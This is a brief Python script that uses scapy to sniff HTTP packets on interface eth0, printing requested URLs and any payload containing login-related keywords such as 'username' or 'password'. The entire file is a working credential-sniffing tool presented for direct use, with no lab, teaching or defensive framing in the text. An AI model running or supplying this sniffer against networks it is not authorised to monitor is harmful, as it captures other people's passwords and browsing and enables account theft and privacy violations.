#!/usr/bin/env python

#Import modules
import scapy.all as scapy
from scapy.layers import http


# Function to sniff packet
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# Function to get any URLs in the packet
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# Function to get a possible username and password in the packet
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "userName", "user", "name", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")


sniff("eth0")
